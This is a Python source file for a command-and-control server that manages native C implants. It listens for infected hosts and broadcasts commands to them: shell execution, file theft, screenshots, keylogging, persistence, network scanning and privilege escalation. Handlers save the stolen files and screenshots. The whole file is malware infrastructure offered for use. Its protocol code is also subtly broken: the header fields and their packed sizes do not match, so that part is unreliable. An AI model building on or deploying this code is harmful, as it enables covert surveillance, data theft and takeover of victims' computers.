#!/usr/bin/env python3
"""
Native Protocol Bridge for C Payload Support
Provides communication bridge between Python C2 server and native C payloads
"""

import os
import sys
import json
import socket
import struct
import threading
import time
import base64
import hashlib
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass
from enum import Enum
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PayloadType(Enum):
    """Types of native payloads supported"""
    WINDOWS_X86 = "windows_x86"
    WINDOWS_X64 = "windows_x64"
    LINUX_X86 = "linux_x86"
    LINUX_X64 = "linux_x64"
    MACOS_X64 = "macos_x64"

class CommandType(Enum):
    """Types of commands that can be sent to native payloads"""
    SHELL_COMMAND = 0x01
    FILE_UPLOAD = 0x02
    FILE_DOWNLOAD = 0x03
    SCREENSHOT = 0x04
    KEYLOG = 0x05
    PROCESS_LIST = 0x06
    SYSTEM_INFO = 0x07
    PERSISTENCE = 0x08
    NETWORK_SCAN = 0x09
    PRIVILEGE_ESCALATION = 0x0A

@dataclass
class NativeCommand:
    """Command structure for native payloads"""
    command_type: CommandType
    command_id: int
    payload: bytes
    metadata: Dict[str, Any]
    timestamp: float

@dataclass
class NativeResponse:
    """Response structure from native payloads"""
    command_id: int
    success: bool
    data: bytes
    error_message: Optional[str]
    timestamp: float

class NativeProtocolBridge:
    """Bridge for communicating with native C payloads"""
    
    def __init__(self, listen_port: int = 4448):
        self.listen_port = listen_port
        self.active_connections: Dict[str, socket.socket] = {}
        self.command_queue: List[NativeCommand] = []
        self.response_handlers: Dict[int, callable] = {}
        self.running = False
        self.server_socket: Optional[socket.socket] = None
        self.connection_lock = threading.RLock()
        self.command_lock = threading.RLock()
        
        # Protocol constants
        self.MAGIC_HEADER = b"ORANOLIO_C2"
        self.VERSION = 1
        self.MAX_PAYLOAD_SIZE = 1024 * 1024  # 1MB
        self.COMMAND_TIMEOUT = 30  # 30 seconds
        
    def start_server(self):
        """Start the native protocol server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.listen_port))
            self.server_socket.listen(10)
            self.running = True
            
            logger.info(f"Native protocol bridge started on port {self.listen_port}")
            
            # Start connection handler thread
            connection_thread = threading.Thread(target=self._handle_connections, daemon=True)
            connection_thread.start()
            
            # Start command processor thread
            processor_thread = threading.Thread(target=self._process_commands, daemon=True)
            processor_thread.start()
            
        except Exception as e:
            logger.error(f"Failed to start native protocol bridge: {e}")
            raise
    
    def stop_server(self):
        """Stop the native protocol server"""
        self.running = False
        
        with self.connection_lock:
            for conn_id, sock in self.active_connections.items():
                try:
                    sock.close()
                except:
                    pass
            self.active_connections.clear()
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        logger.info("Native protocol bridge stopped")
    
    def _handle_connections(self):
        """Handle incoming connections from native payloads"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                connection_id = f"{address[0]}:{address[1]}_{int(time.time())}"
                
                logger.info(f"New native payload connection: {connection_id} from {address}")
                
                # Start handler thread for this connection
                handler_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, connection_id),
                    daemon=True
                )
                handler_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error accepting connection: {e}")
                break
    
    def _handle_client(self, client_socket: socket.socket, connection_id: str):
        """Handle communication with a specific client"""
        try:
            with self.connection_lock:
                self.active_connections[connection_id] = client_socket
            
            while self.running:
                # Receive command from client
                response = self._receive_response(client_socket)
                if response:
                    self._handle_response(response, connection_id)
                else:
                    break
                    
        except Exception as e:
            logger.error(f"Error handling client {connection_id}: {e}")
        finally:
            with self.connection_lock:
                if connection_id in self.active_connections:
                    del self.active_connections[connection_id]
            try:
                client_socket.close()
            except:
                pass
            logger.info(f"Client {connection_id} disconnected")
    
    def _receive_response(self, client_socket: socket.socket) -> Optional[NativeResponse]:
        """Receive a response from a native payload"""
        try:
            # Receive header
            header_data = client_socket.recv(16)
            if len(header_data) != 16:
                return None
            
            # Parse header
            magic, version, command_id, success, data_length = struct.unpack('>4sBBHQ', header_data)
            
            if magic != self.MAGIC_HEADER:
                logger.warning(f"Invalid magic header: {magic}")
                return None
            
            if version != self.VERSION:
                logger.warning(f"Unsupported version: {version}")
                return None
            
            # Receive data
            data = b''
            while len(data) < data_length:
                chunk = client_socket.recv(min(data_length - len(data), 4096))
                if not chunk:
                    return None
                data += chunk
            
            # Receive error message if any
            error_message = None
            if not success:
                error_length = struct.unpack('>H', client_socket.recv(2))[0]
                if error_length > 0:
                    error_message = client_socket.recv(error_length).decode('utf-8', errors='ignore')
            
            return NativeResponse(
                command_id=command_id,
                success=bool(success),
                data=data,
                error_message=error_message,
                timestamp=time.time()
            )
            
        except Exception as e:
            logger.error(f"Error receiving response: {e}")
            return None
    
    def _handle_response(self, response: NativeResponse, connection_id: str):
        """Handle a response from a native payload"""
        try:
            # Call registered handler if exists
            if response.command_id in self.response_handlers:
                handler = self.response_handlers[response.command_id]
                try:
                    handler(response, connection_id)
                except Exception as e:
                    logger.error(f"Error in response handler: {e}")
                finally:
                    # Remove handler after use
                    del self.response_handlers[response.command_id]
            
            logger.info(f"Response received for command {response.command_id}: {'SUCCESS' if response.success else 'FAILED'}")
            
        except Exception as e:
            logger.error(f"Error handling response: {e}")
    
    def _process_commands(self):
        """Process queued commands"""
        while self.running:
            try:
                with self.command_lock:
                    if not self.command_queue:
                        time.sleep(0.1)
                        continue
                    
                    command = self.command_queue.pop(0)
                
                # Send command to all active connections
                self._send_command_to_all(command)
                
            except Exception as e:
                logger.error(f"Error processing command: {e}")
                time.sleep(1)
    
    def _send_command_to_all(self, command: NativeCommand):
        """Send command to all active connections"""
        with self.connection_lock:
            for connection_id, client_socket in self.active_connections.items():
                try:
                    self._send_command(client_socket, command)
                except Exception as e:
                    logger.error(f"Error sending command to {connection_id}: {e}")
    
    def _send_command(self, client_socket: socket.socket, command: NativeCommand):
        """Send a command to a specific client"""
        try:
            # Prepare header
            header = struct.pack(
                '>4sBBHQ',
                self.MAGIC_HEADER,
                self.VERSION,
                command.command_type.value,
                command.command_id,
                len(command.payload)
            )
            
            # Send header
            client_socket.send(header)
            
            # Send payload
            if command.payload:
                client_socket.send(command.payload)
            
            # Send metadata
            metadata_json = json.dumps(command.metadata).encode('utf-8')
            metadata_length = struct.pack('>H', len(metadata_json))
            client_socket.send(metadata_length)
            client_socket.send(metadata_json)
            
            logger.info(f"Command {command.command_id} sent to native payload")
            
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            raise
    
    def send_command_to_native_payload(self, command_type: CommandType, payload: bytes, 
                                     metadata: Dict[str, Any] = None, 
                                     response_handler: callable = None) -> int:
        """Send a command to native payloads"""
        if metadata is None:
            metadata = {}
        
        command_id = int(time.time() * 1000) % 0xFFFFFFFF
        
        command = NativeCommand(
            command_type=command_type,
            command_id=command_id,
            payload=payload,
            metadata=metadata,
            timestamp=time.time()
        )
        
        # Register response handler if provided
        if response_handler:
            self.response_handlers[command_id] = response_handler
        
        # Queue command for processing
        with self.command_lock:
            self.command_queue.append(command)
        
        return command_id
    
    def get_active_connections(self) -> List[str]:
        """Get list of active connection IDs"""
        with self.connection_lock:
            return list(self.active_connections.keys())
    
    def is_connection_active(self, connection_id: str) -> bool:
        """Check if a connection is active"""
        with self.connection_lock:
            return connection_id in self.active_connections

# Global instance
native_bridge = NativeProtocolBridge()

def send_command_to_native_payload(command_type: Union[CommandType, str], 
                                 payload: bytes, 
                                 metadata: Dict[str, Any] = None,
                                 response_handler: callable = None) -> int:
    """Convenience function to send command to native payloads"""
    if isinstance(command_type, str):
        try:
            command_type = CommandType[command_type.upper()]
        except KeyError:
            raise ValueError(f"Invalid command type: {command_type}")
    
    return native_bridge.send_command_to_native_payload(
        command_type, payload, metadata, response_handler
    )

def start_native_bridge(port: int = 4448):
    """Start the native protocol bridge"""
    native_bridge.listen_port = port
    native_bridge.start_server()

def stop_native_bridge():
    """Stop the native protocol bridge"""
    native_bridge.stop_server()

def get_native_bridge():
    """Get the global native bridge instance"""
    return native_bridge

# Command builders for common operations
def build_shell_command(command: str) -> bytes:
    """Build a shell command payload"""
    return command.encode('utf-8')

def build_file_upload_command(file_path: str, data: bytes) -> tuple:
    """Build a file upload command"""
    payload = {
        'file_path': file_path,
        'data': base64.b64encode(data).decode('utf-8')
    }
    return json.dumps(payload).encode('utf-8'), {'operation': 'file_upload'}

def build_file_download_command(file_path: str) -> tuple:
    """Build a file download command"""
    payload = {'file_path': file_path}
    return json.dumps(payload).encode('utf-8'), {'operation': 'file_download'}

def build_screenshot_command() -> tuple:
    """Build a screenshot command"""
    return b'', {'operation': 'screenshot'}

def build_system_info_command() -> tuple:
    """Build a system info command"""
    return b'', {'operation': 'system_info'}

def build_process_list_command() -> tuple:
    """Build a process list command"""
    return b'', {'operation': 'process_list'}

# Response handlers for common operations
def create_file_response_handler(file_path: str, save_path: str):
    """Create a response handler for file operations"""
    def handler(response: NativeResponse, connection_id: str):
        if response.success:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.data)
                logger.info(f"File saved: {save_path}")
            except Exception as e:
                logger.error(f"Error saving file: {e}")
        else:
            logger.error(f"File operation failed: {response.error_message}")
    
    return handler

def create_screenshot_response_handler(save_path: str):
    """Create a response handler for screenshot operations"""
    def handler(response: NativeResponse, connection_id: str):
        if response.success:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.data)
                logger.info(f"Screenshot saved: {save_path}")
            except Exception as e:
                logger.error(f"Error saving screenshot: {e}")
        else:
            logger.error(f"Screenshot failed: {response.error_message}")
    
    return handler

def create_json_response_handler(callback: callable):
    """Create a response handler that parses JSON responses"""
    def handler(response: NativeResponse, connection_id: str):
        if response.success:
            try:
                data = json.loads(response.data.decode('utf-8'))
                callback(data, connection_id)
            except Exception as e:
                logger.error(f"Error parsing JSON response: {e}")
        else:
            logger.error(f"Command failed: {response.error_message}")
    
    return handler

# Example usage and testing
if __name__ == "__main__":
    # Start the bridge
    start_native_bridge()
    
    try:
        # Example: Send a shell command
        command_id = send_command_to_native_payload(
            CommandType.SHELL_COMMAND,
            build_shell_command("whoami"),
            {'description': 'Get current user'}
        )
        print(f"Sent shell command with ID: {command_id}")
        
        # Example: Send a system info command
        def system_info_handler(data, connection_id):
            print(f"System info from {connection_id}: {data}")
        
        command_id = send_command_to_native_payload(
            CommandType.SYSTEM_INFO,
            b'',
            {'description': 'Get system information'},
            create_json_response_handler(system_info_handler)
        )
        print(f"Sent system info command with ID: {command_id}")
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("Stopping native bridge...")
        stop_native_bridge()